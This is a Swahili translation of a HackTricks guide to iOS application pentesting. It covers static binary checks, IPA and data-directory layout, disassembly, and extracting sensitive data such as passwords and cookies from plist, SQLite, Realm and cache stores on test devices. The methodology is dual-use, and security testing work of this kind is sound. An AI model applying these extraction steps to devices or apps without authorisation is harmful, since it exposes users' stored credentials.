# iOS Pentesting

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Tumia [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kujenga na **kuautomatisha mchakato** unaotumia zana za jamii ya **kisasa zaidi** duniani.\
Pata Ufikiaji Leo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako inatangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PR kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Misingi ya iOS

{% content-ref url="ios-basics.md" %}
[ios-basics.md](ios-basics.md)
{% endcontent-ref %}

## Mazingira ya Majaribio

Katika ukurasa huu unaweza kupata habari kuhusu **simulator ya iOS**, **emulators** na **jailbreaking:**

{% content-ref url="ios-testing-environment.md" %}
[ios-testing-environment.md](ios-testing-environment.md)
{% endcontent-ref %}

## Uchambuzi wa Awali

### Operesheni za Msingi za Majaribio ya iOS

Wakati wa majaribio **operesheni kadhaa zitapendekezwa** (unganisha kifaa, soma/andika/pakia/shusha faili, tumia zana fulani...). Kwa hivyo, ikiwa hujui jinsi ya kufanya moja ya hatua hizi tafadhali, **anza kusoma ukurasa**:

{% content-ref url="basic-ios-testing-operations.md" %}
[basic-ios-testing-operations.md](basic-ios-testing-operations.md)
{% endcontent-ref %}

{% hint style="info" %}
Kwa hatua zifuatazo **programu inapaswa kuwa imewekwa** kwenye kifaa na tayari imepata faili ya **IPA** ya programu.\
Soma ukurasa wa [Basic iOS Testing Operations](basic-ios-testing-operations.md) kujifunza jinsi ya kufanya hivi.
{% endhint %}

### Uchambuzi wa Statisa wa Msingi

Inashauriwa kutumia zana ya [**MobSF**](https://github.com/MobSF/Mobile-Security-Framework-MobSF) kufanya Uchambuzi wa Statisa kiotomatiki kwa faili ya IPA.

Utambuzi wa **ulinzi uliopo kwenye faili ya binary**:

*   **PIE (Position Independent Executable)**: Ikiwa imeamilishwa, programu inapakia kwenye anwani ya kumbukumbu ya nasibu kila wakati inapoanza, ikifanya iwe ngumu kutabiri anwani yake ya kumbukumbu ya awali.

```bash
otool -hv <app-binary> | grep PIE   # Inapaswa kuwa na bendera ya PIE
```
*   **Stack Canaries**: Kwa kuthibitisha uadilifu wa stack, thamani ya 'canary' imewekwa kwenye stack kabla ya kuita kazi na inathibitishwa tena mara tu kazi inapomalizika.

```bash
otool -I -v <app-binary> | grep stack_chk   # Inapaswa kuwa na alama: stack_chk_guard na stack_chk_fail
```
*   **ARC (Automatic Reference Counting)**: Kuzuia kasoro za kawaida za uharibifu wa kumbukumbu

```bash
otool -I -v <app-binary> | grep objc_release   # Inapaswa kuwa na alama _objc_release
```
*   **Binary Iliyofichwa**: Binary inapaswa kuwa imefichwa

```bash
otool -arch all -Vl <app-binary> | grep -A5 LC_ENCRYPT   # cryptid inapaswa kuwa 1
```

**Utambuzi wa Vipengele Vyenye Sensa/Hatari**

*   **Algorithms za Hashing Dhaifu**

```bash
# Kwenye kifaa cha iOS
otool -Iv <app> | grep -w "_CC_MD5"
otool -Iv <app> | grep -w "_CC_SHA1"

# Kwenye linux
grep -iER "_CC_MD5"
grep -iER "_CC_SHA1"
```
*   **Fungsi Dhaifu za Random**

```bash
# Kwenye kifaa cha iOS
otool -Iv <app> | grep -w "_random"
otool -Iv <app> | grep -w "_srand"
otool -Iv <app> | grep -w "_rand"

# Kwenye linux
grep -iER "_random"
grep -iER "_srand"
grep -iER "_rand"
```
*   **Fungsi Dhaifu ya 'Malloc'**

```bash
# Kwenye kifaa cha iOS
otool -Iv <app> | grep -w "_malloc"

# Kwenye linux
grep -iER "_malloc"
```
*   **Fungsi Dhaifu na Zenye Mianya**

```bash
# Kwenye kifaa cha iOS
otool -Iv <app> | grep -w "_gets"
otool -Iv <app> | grep -w "_memcpy"
otool -Iv <app> | grep -w "_strncpy"
otool -Iv <app> | grep -w "_strlen"
otool -Iv <app> | grep -w "_vsnprintf"
otool -Iv <app> | grep -w "_sscanf"
otool -Iv <app> | grep -w "_strtok"
otool -Iv <app> | grep -w "_alloca"
otool -Iv <app> | grep -w "_sprintf"
otool -Iv <app> | grep -w "_printf"
otool -Iv <app> | grep -w "_vsprintf"

# Kwenye linux
grep -R "_gets"
grep -iER "_memcpy"
grep -iER "_strncpy"
grep -iER "_strlen"
grep -iER "_vsnprintf"
grep -iER "_sscanf"
grep -iER "_strtok"
grep -iER "_alloca"
grep -iER "_sprintf"
grep -iER "_printf"
grep -iER "_vsprintf"
```

### Uchambuzi wa Kisasa wa Msingi

Angalia uchambuzi wa kisasa ambao [**MobSF**](https://github.com/MobSF/Mobile-Security-Framework-MobSF) hufanya. Utahitaji kutembea kupitia maoni tofauti na kuingiliana nao lakini itakuwa ikifunga darasa kadhaa wakati wa kufanya mambo mengine na itakuandaa ripoti mara utakapomaliza.

### Orodha ya Programu Zilizowekwa

Tumia amri `frida-ps -Uai` kuamua **kitambulisho cha mfuko** cha programu zilizowekwa:
```bash
$ frida-ps -Uai
PID  Name                 Identifier
----  -------------------  -----------------------------------------
6847  Calendar             com.apple.mobilecal
6815  Mail                 com.apple.mobilemail
-  App Store            com.apple.AppStore
-  Apple Store          com.apple.store.Jolly
-  Calculator           com.apple.calculator
-  Camera               com.apple.camera
-  iGoat-Swift          OWASP.iGoat-Swift
```
### Uchunguzi wa Msingi na Hooking

Jifunze jinsi ya **kuorodhesha sehemu za programu** na jinsi ya **kuunganisha njia na darasa** kwa urahisi na objection:

{% content-ref url="ios-hooking-with-objection.md" %}
[ios-hooking-with-objection.md](ios-hooking-with-objection.md)
{% endcontent-ref %}

### Muundo wa IPA

Muundo wa faili ya **IPA** ni kimsingi kama wa **paki iliyozipwa**. Kwa kubadilisha kirefusho chake kuwa `.zip`, inaweza **kufunguliwa** ili kuonyesha maudhui yake. Ndani ya muundo huu, **Bundle** inawakilisha programu kamili iliyopakwa tayari kwa usakinishaji. Ndani yake, utapata saraka iliyoitwa `<JINA>.app`, ambayo ina vifaa vya programu.

* **`Info.plist`**: Faili hii inashikilia maelezo maalum ya usanidi wa programu.
* **`_CodeSignature/`**: Saraka hii inajumuisha faili ya plist ambayo ina saini, ikidhibitisha uadilifu wa faili zote katika pakiti.
* **`Assets.car`**: Hii ni nyaraka iliyopakiwa ambayo inahifadhi faili za mali kama ikoni.
* **`Frameworks/`**: Saraka hii ina maktaba za asili za programu, ambazo zinaweza kuwa katika mfumo wa faili za `.dylib` au `.framework`.
* **`PlugIns/`**: Hii inaweza kujumuisha nyongeza za programu, inayojulikana kama faili za `.appex`, ingawa hazipo kila wakati.
*¬†[**`Core Data`**](https://developer.apple.com/documentation/coredata): Inatumika kuokoa data ya kudumu ya programu yako kwa matumizi ya nje ya mtandao, kuhifadhi data ya muda mfupi, na kuongeza uwezo wa kufuta hatua katika programu yako kwenye kifaa kimoja. Ili kusawazisha data kwenye vifaa vingi katika akaunti moja ya iCloud, Core Data inaiga schema yako kiotomatiki kwenye chombo cha CloudKit.
* [**`PkgInfo`**](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPRuntimeConfig/Articles/ConfigApplications.html): Faili ya `PkgInfo` ni njia mbadala ya kubainisha aina na kificho cha muundaji wa programu au pakiti yako.
* **en.lproj, fr.proj, Base.lproj**: Ni pakiti za lugha ambazo zina rasilimali kwa lugha hizo maalum, na rasilimali ya chaguo-msingi ikiwa lugha haipatikani.
* **Usalama**: Saraka ya `_CodeSignature/` inacheza jukumu muhimu katika usalama wa programu kwa kuhakikisha uadilifu wa faili zote zilizopakiwa kupitia saini za kidijitali.
* **Usimamizi wa Mali**: Faili ya `Assets.car` inatumia ujazaji kwa ufanisi kusimamia mali za picha, ambayo ni muhimu kwa kuboresha utendaji wa programu na kupunguza ukubwa wake jumla.
* **Maktaba na Nyongeza**: Saraka hizi zinaonyesha umodulari wa programu za iOS, kuruhusu watengenezaji kuongeza maktaba za nambari zinazoweza kutumika tena (`Frameworks/`) na kuongeza utendaji wa programu (`PlugIns/`).
* **Utaratibu wa Lugha**: Muundo huu unawezesha lugha nyingi, kurahisisha kufikia programu kwa kiwango cha kimataifa kwa kujumuisha rasilimali kwa pakiti za lugha maalum.

**Info.plist**

**Info.plist** ni msingi wa programu za iOS, ikijumuisha data muhimu ya usanidi katika mfumo wa jozi za **funguo-na-thamani**. Faili hii ni muhimu si tu kwa programu lakini pia kwa nyongeza za programu na maktaba zilizopakwa ndani. Ina muundo wa XML au muundo wa binary na inashikilia habari muhimu kutoka kwa ruhusa za programu hadi usanidi wa usalama. Ili kuchunguza kwa undani funguo zilizopo, mtu anaweza kurejelea [**Hati ya Maendeleo ya Apple**](https://developer.apple.com/documentation/bundleresources/information_property_list?language=objc).

Kwa wale wanaotaka kufanya kazi na faili hii katika muundo rahisi zaidi, uongofu wa XML unaweza kufanywa kwa urahisi kupitia matumizi ya `plutil` kwenye macOS (inapatikana kwa asili kwenye toleo 10.2 na baadaye) au `plistutil` kwenye Linux. Amri za uongofu ni kama ifuatavyo:

- **Kwa macOS**:
```bash
$ plutil -convert xml1 Info.plist
```
- **Kwa Linux**:
```bash
$ apt install libplist-utils
$ plistutil -i Info.plist -o Info_xml.plist
```
Miongoni mwa habari nyingi ambazo faili ya **Info.plist** inaweza kufichua, vipengele muhimu ni pamoja na herufi za idhini za programu (`UsageDescription`), mpangilio wa URL maalum (`CFBundleURLTypes`), na mipangilio ya Usalama wa Usafirishaji wa Programu (`NSAppTransportSecurity`). Vipengele hivi, pamoja na vingine kama vile aina za hati za desturi zilizosafirishwa/kuingizwa (`UTExportedTypeDeclarations` / `UTImportedTypeDeclarations`), vinaweza kupatikana kwa urahisi kwa kuchunguza faili au kutumia amri rahisi ya `grep`:
```bash
$ grep -i <keyword> Info.plist
```
**Njia za Data**

Katika mazingira ya iOS, kuna saraka maalum zilizotengwa kwa **programu za mfumo** na **programu zilizosakinishwa na mtumiaji**. Programu za mfumo zinapatikana katika saraka ya `/Applications`, wakati programu zilizosakinishwa na mtumiaji zinawekwa chini ya `/private/var/containers/`. Programu hizi zinapewa kitambulisho kipekee kinachojulikana kama **UUID ya biti 128**, hivyo kufanya kazi ya kutafuta saraka ya programu kwa mkono kuwa ngumu kutokana na jina la saraka kuwa la kubahatisha.

Ili kurahisisha ugunduzi wa saraka ya kusakinisha programu ya mtumiaji, zana ya **objection** inatoa amri muhimu, `env`. Amri hii inaonyesha habari ya kina kuhusu saraka ya programu husika. Hapa chini ni mfano wa jinsi ya kutumia amri hii:
```bash
OWASP.iGoat-Swift on (iPhone: 11.1.2) [usb] # env

Name               Path
-----------------  -------------------------------------------------------------------------------------------
BundlePath         /var/containers/Bundle/Application/3ADAF47D-A734-49FA-B274-FBCA66589E67/iGoat-Swift.app
CachesDirectory    /var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/Library/Caches
DocumentDirectory  /var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/Documents
LibraryDirectory   /var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/Library
```
Au, jina la programu linaweza kutafutwa ndani ya `/private/var/containers` kwa kutumia amri ya `find`:
```bash
find /private/var/containers -name "Progname*"
```
Amri kama vile `ps` na `lsof` pia zinaweza kutumika kutambua mchakato wa programu ya programu na orodha ya faili zilizofunguliwa, mtawalia, zinatoa ufahamu juu ya njia za saraka za aktive za programu:
```bash
ps -ef | grep -i <app-name>
lsof -p <pid> | grep -i "/containers" | head -n 1
```
**Folda ya Bundle:**

* **AppName.app**
* Hii ni Bundle ya Programu kama ilivyoonekana hapo awali katika IPA, ina data muhimu ya programu, yaliyomo ya tuli pamoja na binary iliyokompiliwa ya programu.
* Folda hii inaonekana kwa watumiaji, lakini **watumiaji hawawezi kuandika ndani yake**.
* Yaliyomo katika folda hii **hayasaidiwi na nakala rudufu**.
* Yaliyomo ya folda hii hutumiwa kwa **uthibitisho wa saini ya nambari**.

**Folda ya Data:**

* **Documents/**
* Ina data yote iliyoanzishwa na mtumiaji. Mtumiaji wa mwisho wa programu ndiye anayeanzisha uundaji wa data hii.
* Inaonekana kwa watumiaji na **watumiaji wanaweza kuandika ndani yake**.
* Yaliyomo katika folda hii **inasaidiwa na nakala rudufu**.
* Programu inaweza kuzima njia kwa kuweka `NSURLIsExcludedFromBackupKey`.
* **Library/**
* Ina faili zote ambazo sio za mtumiaji maalum, kama vile **hifadhidata**, **mapendekezo**, **vidakuzi**, na faili za usanidi za orodha ya mali (plist).
* Programu za iOS kawaida hutumia vichupo vya `Application Support` na `Caches`, lakini programu inaweza kuunda vichupo maalum.
* **Library/Caches/**
* Ina **faili zilizohifadhiwa kwa muda**.
* Haionekani kwa watumiaji na **watumiaji hawawezi kuandika ndani yake**.
* Yaliyomo katika folda hii **hayasaidiwi na nakala rudufu**.
* Mfumo wa uendeshaji unaweza kufuta faili za folda hii moja kwa moja wakati programu haifanyi kazi na nafasi ya kuhifadhi inapungua.
* **Library/Application Support/**
* Ina **faili za kudumu** zinazohitajika kwa uendeshaji wa programu.
* **Haionekani** kwa watumiaji na watumiaji hawawezi kuandika ndani yake.
* Yaliyomo katika folda hii **inasaidiwa na nakala rudufu**.
* Programu inaweza kuzima njia kwa kuweka `NSURLIsExcludedFromBackupKey`.
* **Library/Preferences/**
* Hutumiwa kuhifadhi mali ambazo **zinaendelea hata baada ya kuanzisha upya kwa programu**.
* Taarifa huhifadhiwa, bila kusimbwa, ndani ya sanduku la programu katika faili ya plist iliyoitwa \[BUNDLE\_ID].plist.
* Pamoja na faili hii, unaweza kupata jozi za ufunguo/kipimo zilizohifadhiwa kwa kutumia `NSUserDefaults`.
* **tmp/**
* Tumia folda hii kuandika faili **za muda** ambazo hazihitaji kudumu kati ya uzinduzi wa programu.
* Ina faili zilizohifadhiwa kwa muda mfupi.
* **Haionekani** kwa watumiaji.
* Yaliyomo katika folda hii hayasaidiwi na nakala rudufu.
* Mfumo wa uendeshaji unaweza kufuta faili za folda hii moja kwa moja wakati programu haifanyi kazi na nafasi ya kuhifadhi inapungua.

Hebu tuangalie kwa karibu Folda ya Programu ya iGoat-Swift (.app) ndani ya Folda ya Bundle (`/var/containers/Bundle/Application/3ADAF47D-A734-49FA-B274-FBCA66589E67/iGoat-Swift.app`):
```bash
OWASP.iGoat-Swift on (iPhone: 11.1.2) [usb] # ls
NSFileType      Perms  NSFileProtection    ...  Name
------------  -------  ------------------  ...  --------------------------------------
Regular           420  None                ...  rutger.html
Regular           420  None                ...  mansi.html
Regular           420  None                ...  splash.html
Regular           420  None                ...  about.html

Regular           420  None                ...  LICENSE.txt
Regular           420  None                ...  Sentinel.txt
Regular           420  None                ...  README.txt
```
### Kugeuza Binary

Ndani ya folda ya `<application-name>.app` utapata faili ya binary inayoitwa `<application-name>`. Hii ndio faili ambayo itatekelezwa. Unaweza kufanya ukaguzi wa msingi wa binary na zana ya **`otool`**:
```bash
otool -Vh DVIA-v2 #Check some compilation attributes
magic  cputype cpusubtype  caps    filetype ncmds sizeofcmds      flags
MH_MAGIC_64    ARM64        ALL  0x00     EXECUTE    65       7112   NOUNDEFS DYLDLINK TWOLEVEL WEAK_DEFINES BINDS_TO_WEAK PIE

otool -L DVIA-v2 #Get third party libraries
DVIA-v2:
/usr/lib/libc++.1.dylib (compatibility version 1.0.0, current version 400.9.1)
/usr/lib/libsqlite3.dylib (compatibility version 9.0.0, current version 274.6.0)
/usr/lib/libz.1.dylib (compatibility version 1.0.0, current version 1.2.11)
@rpath/Bolts.framework/Bolts (compatibility version 1.0.0, current version 1.0.0)
[...]
```
**Angalia ikiwa programu imefichwa**

Angalia ikiwa kuna matokeo yoyote kwa:
```bash
otool -l <app-binary> | grep -A 4 LC_ENCRYPTION_INFO
```
**Kuvunja sehemu ya binary**

Vunja sehemu ya maandishi:
```bash
otool -tV DVIA-v2
DVIA-v2:
(__TEXT,__text) section
+[DDLog initialize]:
0000000100004ab8    sub    sp, sp, #0x60
0000000100004abc    stp    x29, x30, [sp, #0x50]   ; Latency: 6
0000000100004ac0    add    x29, sp, #0x50
0000000100004ac4    sub    x8, x29, #0x10
0000000100004ac8    mov    x9, #0x0
0000000100004acc    adrp    x10, 1098 ; 0x10044e000
0000000100004ad0    add    x10, x10, #0x268
```
Kwa kuchapisha **sehemu ya Objective-C** ya programu ya mfano, unaweza kutumia:
```bash
otool -oV DVIA-v2
DVIA-v2:
Contents of (__DATA,__objc_classlist) section
00000001003dd5b8 0x1004423d0 _OBJC_CLASS_$_DDLog
isa        0x1004423a8 _OBJC_METACLASS_$_DDLog
superclass 0x0 _OBJC_CLASS_$_NSObject
cache      0x0 __objc_empty_cache
vtable     0x0
data       0x1003de748
flags          0x80
instanceStart  8
```
Ili kupata nambari ya Objective-C iliyopunguzwa zaidi, unaweza kutumia [**class-dump**](http://stevenygard.com/projects/class-dump/):
```bash
class-dump some-app
//
//     Generated by class-dump 3.5 (64 bit).
//
//     class-dump is Copyright (C) 1997-1998, 2000-2001, 2004-2013 by Steve Nygard.
//

#pragma mark Named Structures

struct CGPoint {
double _field1;
double _field2;
};

struct CGRect {
struct CGPoint _field1;
struct CGSize _field2;
};

struct CGSize {
double _field1;
double _field2;
};
```
Hata hivyo, chaguo bora za kuchambua faili ya binary ni: [**Hopper**](https://www.hopperapp.com/download.html?) na [**IDA**](https://www.hex-rays.com/products/ida/support/download\_freeware/).

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Tumia [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kujenga na **kutumia mchakato** kwa kutumia zana za jamii za **kisasa zaidi**.\
Pata Ufikiaji Leo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Uhifadhi wa Data

Ili kujifunza jinsi iOS inahifadhi data kwenye kifaa, soma ukurasa huu:

{% content-ref url="ios-basics.md" %}
[ios-basics.md](ios-basics.md)
{% endcontent-ref %}

{% hint style="warning" %}
Maeneo yafuatayo ya kuhifadhi habari yanapaswa kuchunguzwa **baada ya kusakinisha programu**, **baada ya kuchunguza kazi zote** za programu, na hata baada ya **kutoka kwenye akaunti ya mtumiaji mmoja na kuingia kwenye akaunti nyingine**.\
Lengo ni kupata **habari nyeti zisizo salama** za programu (nywila, alama za usalama), ya mtumiaji wa sasa na ya watumiaji walioingia hapo awali.
{% endhint %}

### Plist

Faili za **plist** ni faili za XML zilizo na **jozi za funguo-na-thamani**. Ni njia ya kuhifadhi data endelevu, kwa hivyo mara nyingi unaweza kupata **habari nyeti katika faili hizi**. Inashauriwa kuangalia faili hizi baada ya kusakinisha programu na baada ya kuitumia kwa kiasi kikubwa ili kuona ikiwa data mpya imeandikwa.

Njia ya kawaida ya kuhifadhi data katika faili za plist ni kupitia matumizi ya **NSUserDefaults**. Faili hii ya plist imehifadhiwa ndani ya sanduku la programu katika **`Library/Preferences/<appBundleID>.plist`**

Darasa la [`NSUserDefaults`](https://developer.apple.com/documentation/foundation/nsuserdefaults) hutoa kiolesura cha programu ya kuwasiliana na mfumo wa chaguo-msingi. Mfumo wa chaguo-msingi huruhusu programu kubinafsisha tabia yake kulingana na **mapendeleo ya mtumiaji**. Data iliyohifadhiwa na `NSUserDefaults` inaweza kuonekana kwenye kifurushi cha programu. Darasa hili linahifadhi **data** katika **faili ya plist**, lakini linapaswa kutumiwa na kiasi kidogo cha data.

Data hii haiwezi kupatikana moja kwa moja kupitia kompyuta ya kuaminika, lakini inaweza kupatikana kwa kufanya **chelezo**.

Unaweza **kudump** habari iliyohifadhiwa kwa kutumia **`NSUserDefaults`** kwa kutumia `ios nsuserdefaults get` ya objection

Ili kupata plist zote zinazotumiwa na programu, unaweza kufikia `/private/var/mobile/Containers/Data/Application/{APPID}` na kukimbia:
```bash
find ./ -name "*.plist"
```
Kuwa na uwezo wa kubadilisha faili kutoka muundo wa **XML au binary (bplist)** kwenda XML, njia mbalimbali zinapatikana kulingana na mfumo wako wa uendeshaji:

**Kwa Watumiaji wa macOS:**
Tumia amri ya `plutil`. Ni zana iliyojengwa ndani ya macOS (10.2+), iliyoundwa kwa kusudi hili:
```bash
$ plutil -convert xml1 Info.plist
```
**Kwa Watumiaji wa Linux:**
Weka `libplist-utils` kwanza, kisha tumia `plistutil` kuibadilisha faili yako:
```bash
$ apt install libplist-utils
$ plistutil -i Info.plist -o Info_xml.plist
```
**Ndani ya Kikao cha Kupinga:**
Kwa ajili ya kuchambua programu za simu, amri maalum inaruhusu kubadilisha faili za plist moja kwa moja:
```bash
ios plist cat /private/var/mobile/Containers/Data/Application/<Application-UUID>/Library/Preferences/com.some.package.app.plist
```
### Core Data

[`Core Data`](https://developer.apple.com/library/content/documentation/Cocoa/Conceptual/CoreData/nsfetchedresultscontroller.html#//apple\_ref/doc/uid/TP40001075-CH8-SW1) ni mfumo wa kusimamia safu ya mfano wa vitu katika programu yako. [Core Data inaweza kutumia SQLite kama hifadhi yake endelevu](https://cocoacasts.com/what-is-the-difference-between-core-data-and-sqlite/), lakini mfumo yenyewe sio hifadhidata.\
CoreData haifanyi data yake kuwa na siri kwa chaguo-msingi. Hata hivyo, safu ya ziada ya siri inaweza kuongezwa kwa CoreData. Angalia [Repo ya GitHub](https://github.com/project-imas/encrypted-core-data) kwa maelezo zaidi.

Unaweza kupata habari ya SQLite ya Core Data ya programu katika njia `/private/var/mobile/Containers/Data/Application/{APPID}/Library/Application Support`

**Ikiwa unaweza kufungua SQLite na kupata habari nyeti, basi umepata hitilafu ya usanidi.**

{% code title="Code kutoka iGoat" %}
```objectivec
-(void)storeDetails {
AppDelegate * appDelegate = (AppDelegate *)(UIApplication.sharedApplication.delegate);

NSManagedObjectContext *context =[appDelegate managedObjectContext];

User *user = [self fetchUser];
if (user) {
return;
}
user = [NSEntityDescription insertNewObjectForEntityForName:@"User"
inManagedObjectContext:context];
user.email = CoreDataEmail;
user.password = CoreDataPassword;
NSError *error;
if (![context save:&error]) {
NSLog(@"Error in saving data: %@", [error localizedDescription]);

}else{
NSLog(@"data stored in core data");
}
}
```
{% endcode %}

### YapDatabase

[YapDatabase](https://github.com/yapstudios/YapDatabase) ni uhifadhi wa key/value uliojengwa juu ya SQLite.\
Kwa kuwa Yap databases ni databases za sqlite unaweza kuzipata kwa kutumia amri iliyopendekezwa katika sehemu iliyotangulia.

### Databases Nyingine za SQLite

Ni kawaida kwa programu kuunda database zao za sqlite. Wanaweza **kuhifadhi** **data** **nyeti** ndani yao na kuacha bila kusimbwa. Kwa hiyo, ni vizuri daima kuangalia kila database ndani ya saraka ya programu. Kwa hiyo nenda kwenye saraka ya programu ambapo data inahifadhiwa (`/private/var/mobile/Containers/Data/Application/{APPID}`)
```bash
find ./ -name "*.sqlite" -or -name "*.db"
```
### Firebase Real-Time Databases

Watengenezaji wana uwezo wa **kuhifadhi na kusawazisha data** ndani ya **database ya wingu ya NoSQL** kupitia Firebase Real-Time Databases. Data iliyohifadhiwa katika muundo wa JSON inasawazishwa kwa wateja wote waliounganishwa kwa wakati halisi.

Unaweza kupata jinsi ya kuchunguza mazingira yasiyofaa ya database za Firebase hapa:

{% content-ref url="../../network-services-pentesting/pentesting-web/buckets/firebase-database.md" %}
[firebase-database.md](../../network-services-pentesting/pentesting-web/buckets/firebase-database.md)
{% endcontent-ref %}

### Realm databases

[Realm Objective-C](https://realm.io/docs/objc/latest/) na [Realm Swift](https://realm.io/docs/swift/latest/) hutoa njia mbadala yenye nguvu kwa uhifadhi wa data, ambayo haipatikani kupitia Apple. Kwa chaguo-msingi, wanahifadhi data bila kusimbwa, na kusimbwa kunapatikana kupitia usanidi maalum.

Database zinapatikana katika: `/private/var/mobile/Containers/Data/Application/{APPID}`. Kwa kuchunguza faili hizi, mtu anaweza kutumia amri kama vile:
```bash
iPhone:/private/var/mobile/Containers/Data/Application/A079DF84-726C-4AEA-A194-805B97B3684A/Documents root# ls
default.realm  default.realm.lock  default.realm.management/  default.realm.note|

$ find ./ -name "*.realm*"
```
Kwa kuangalia faili hizi za database, zana ya [**Realm Studio**](https://github.com/realm/realm-studio) inapendekezwa.

Kuweka encryption ndani ya database ya Realm, unaweza kutumia kificho kifuatacho:
```swift
// Open the encrypted Realm file where getKey() is a method to obtain a key from the Keychain or a server
let config = Realm.Configuration(encryptionKey: getKey())
do {
let realm = try Realm(configuration: config)
// Use the Realm as normal
} catch let error as NSError {
// If the encryption key is wrong, `error` will say that it's an invalid database
fatalError("Error opening realm: \(error)")
}
```
### Maktaba za Couchbase Lite

[Couchbase Lite](https://github.com/couchbase/couchbase-lite-ios) inaelezwa kama injini ya **kidogo** na **iliyowekwa** ya hifadhidata ambayo inafuata njia ya **nyaraka-iliyolengwa** (NoSQL). Imetengenezwa kuwa ya asili kwa **iOS** na **macOS**, inatoa uwezo wa kusawazisha data kwa urahisi.

Ili kutambua maktaba za Couchbase zinazowezekana kwenye kifaa, saraka ifuatayo inapaswa kuchunguzwa:
```bash
ls /private/var/mobile/Containers/Data/Application/{APPID}/Library/Application Support/
```
### Vidakuzi

iOS hifadhi vidakuzi vya programu katika **`Library/Cookies/cookies.binarycookies`** ndani ya kila folda ya programu. Hata hivyo, waendelezaji mara kwa mara huchagua kuziweka katika **keychain** kwani **faili ya kuki iliyotajwa inaweza kupatikana katika nakala za akiba**.

Ili kukagua faili za vidakuzi, unaweza kutumia [**scripti hii ya python**](https://github.com/mdegrazia/Safari-Binary-Cookie-Parser) au tumia **`ios cookies get`** ya objection.\
**Pia unaweza kutumia objection** kubadilisha faili hizi kuwa muundo wa JSON na kukagua data.
```bash
...itudehacks.DVIAswiftv2.develop on (iPhone: 13.2.3) [usb] # ios cookies get --json
[
{
"domain": "highaltitudehacks.com",
"expiresDate": "2051-09-15 07:46:43 +0000",
"isHTTPOnly": "false",
"isSecure": "false",
"name": "username",
"path": "/",
"value": "admin123",
"version": "0"
}
]
```
### Kache

Kwa chaguo-msingi, NSURLSession hifadhi data, kama vile **ombi za HTTP na majibu katika database ya Cache.db**. Database hii inaweza kuwa na **data nyeti**, kama vile alama, majina ya watumiaji au habari nyeti nyingine zimehifadhiwa. Ili kupata habari zilizohifadhiwa, fungua saraka ya data ya programu (`/var/mobile/Containers/Data/Application/<UUID>`) na nenda kwenye `/Library/Caches/<Bundle Identifier>`. **Cache ya WebKit pia inahifadhiwa katika faili ya Cache.db**. **Objection** inaweza kufungua na kuingiliana na database kwa kutumia amri `sqlite connect Cache.db`, kwani ni **database ya kawaida ya SQLite**.

Inashauriwa **kuzima kuhifadhi data hii**, kwani inaweza kuwa na habari nyeti katika ombi au majibu. Orodha ifuatayo inaonyesha njia tofauti za kufanikisha hili:

1. Inashauriwa kuondoa majibu yaliyohifadhiwa baada ya kujitolea. Hii inaweza kufanywa kwa kutumia njia iliyotolewa na Apple inayoitwa [`removeAllCachedResponses`](https://developer.apple.com/documentation/foundation/urlcache/1417802-removeallcachedresponses) Unaweza kuita njia hii kama ifuatavyo:

`URLCache.shared.removeAllCachedResponses()`

Njia hii itaondoa ombi zote zilizohifadhiwa na majibu kutoka kwenye faili ya Cache.db.
2. Ikiwa hauitaji kutumia faida ya vidakuzi, inashauriwa kutumia mali ya [.ephemeral](https://developer.apple.com/documentation/foundation/urlsessionconfiguration/1410529-ephemeral) ya URLSession, ambayo itazima kuhifadhi vidakuzi na Cache.

[Hati ya Apple](https://developer.apple.com/documentation/foundation/urlsessionconfiguration/1410529-ephemeral):

`Kitengo cha usanidi wa kikao cha muda mfupi ni sawa na usanidi wa kikao cha chaguo-msingi (angalia chaguo-msingi), isipokuwa kitengo cha kikao kinachohusika hakihifadhi cache, hifadhi za kitambulisho, au data yoyote inayohusiana na kikao kwenye diski. Badala yake, data inayohusiana na kikao huhifadhiwa kwenye RAM. Wakati pekee kikao cha muda mfupi kinapoandika data kwenye diski ni wakati unamwambia kuandika yaliyomo ya URL kwenye faili.`
3. Cache inaweza pia kuzimwa kwa kuweka Sera ya Cache kuwa [.notAllowed](https://developer.apple.com/documentation/foundation/urlcache/storagepolicy/notallowed). Itazima kuhifadhi Cache kwa njia yoyote, iwe kwenye kumbukumbu au diski.

### Picha za Skrini

